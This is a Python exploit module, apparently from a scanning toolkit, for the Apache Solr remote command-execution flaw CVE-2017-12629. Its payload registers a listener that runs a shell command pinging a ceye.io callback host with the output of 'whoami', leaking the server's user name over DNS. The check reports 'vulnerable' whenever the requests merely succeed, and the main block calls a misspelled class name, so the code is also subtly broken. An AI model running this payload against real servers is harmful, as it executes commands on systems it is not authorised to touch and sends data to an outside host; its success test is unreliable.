#!/usr/bin/env python3

'''
name: CVE-2017-12629漏洞
description: CVE-2017-12629漏洞可执行任意命令
'''

from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class CVE_2017_12629_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                   'Accept': '*/*',
                   'Accept-Language': 'en',
                   'Connection': 'close',
                  }
        self.headers1 = {
                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                   'Accept': '*/*',
                   'Accept-Language': 'en',
                   'Connection': 'close',
                   'Content-Type': 'application/json'
                  }
        self.capta = get_capta()
        #self.config_payload = '''{"add-listener":{"event":"postCommit","name":'%s',"class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping `echo %s`.ip.port.lujuii.ceye.io"]}}''' %(self.capta, self.capta)  
        self.config_payload = '''{"add-listener":{"event":"postCommit","name":"zxlss3","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping `whoami`.ip.port.lujuii.ceye.io"]}}'''
        print(self.config_payload)
        self.update_payload = '''[{"id":"test"}]'''

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        config_url = self.url + '/solr/demo/config'
        update_url = self.url + '/solr/demo/update'
        try:
            config_req = request.post(config_url, headers = self.headers, data = self.config_payload, )
            update_req = request.post(update_url, headers = self.headers1, data = self.update_payload)
            print('存在CVE-2017_12629漏洞')
            return True
        except Exception as e:
            print(e)
            print('不存在CVE-2017_12629漏洞')
            return False
        finally:
            pass

if  __name__ == "__main__":
    CVE_2017_12629 = CVE_2017_12629__BaseVerify('http://127.0.0.1:8983')
    CVE_2017_12629.run()